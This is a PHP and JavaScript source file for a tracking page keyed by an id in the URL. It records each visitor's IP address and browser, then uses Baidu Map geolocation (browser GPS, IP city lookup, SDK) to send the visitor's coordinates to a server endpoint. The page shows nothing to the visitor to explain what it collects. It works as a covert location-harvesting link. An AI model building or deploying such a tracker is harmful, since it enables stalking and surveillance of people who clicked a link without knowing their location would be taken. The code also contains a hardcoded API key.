<?php
require_once 'mysql.php';

$id = $_GET['id'];
if(!$id){
    die('id错误');
}

$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];

//创建用户访问用户信息
$intIp = ip2long($ip);
$mysql = new Mysql();

$data = array('track_id'=>$id,'ip' => $intIp,'user_agent' => $userAgent, 'create_time'=>time());
$res = $mysql->insert($data);
if(!$res){
    //插入错误
    die('插入错误');
}
$lastId = $res;
?>

<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="initial-scale=1.0, user-scalable=no" />
    <script type="text/javascript" src="http://api.map.baidu.com/api?v=2.0&ak=PuRL8soZmobdbOIgdGDQ0qCxdYWTGgK2"></script>
    <title>浏览器定位</title>
</head>
<body>

</body>
</html>
<script src="./jquery-3.4.1.min.js"></script>
<script type="text/javascript">

    var id = <?php echo $lastId; ?>;

    // 百度地图API功能
    var geolocation = new BMap.Geolocation();

    var lng = 0,lat = 0;

    //浏览器丁文
    var getBrowserLocation = function () {
        var res = geolocation.getCurrentPosition(function(r){
            if(this.getStatus() == BMAP_STATUS_SUCCESS){
                console.log('您的位置：'+r.point.lng+','+r.point.lat);
                lng = r.point.lng;
                lat = r.point.lat;
                request({'id':id,'type':'browser','lng':lng,'lat':lat});
            }else {
                console.log('failed'+this.getStatus());
            }
        },{enableHighAccuracy: true})

    }

    //IP定位
    var getIpLoaction = function(){
        function myFun(result){
            var cityName = result.name;
            request({'id':id,'type':'ip','city':cityName});
        }
        var myCity = new BMap.LocalCity();
        myCity.get(myFun);
    }



    //SDK定位
    var getSDKLocation = function(){

        // 开启SDK辅助定位
        geolocation.enableSDKLocation();
        geolocation.getCurrentPosition(function(r){
            if(this.getStatus() == BMAP_STATUS_SUCCESS){
                console.log('您的位置：'+r.point.lng+','+r.point.lat);
                request({'id':id,'type':'sdk','lng':r.point.lng,'lat':r.point.lat});
            }
            else {
                console.log('failed'+this.getStatus());
            }
        });
    }

    var request = function(data){
         $.ajax({
            'url':'/request.php',
            'data':data,
            'type':'POST',
            success:function(res){
                console.log(res);
            },
        });
    }


    getBrowserLocation();
    getIpLoaction();
    getSDKLocation();



</script>
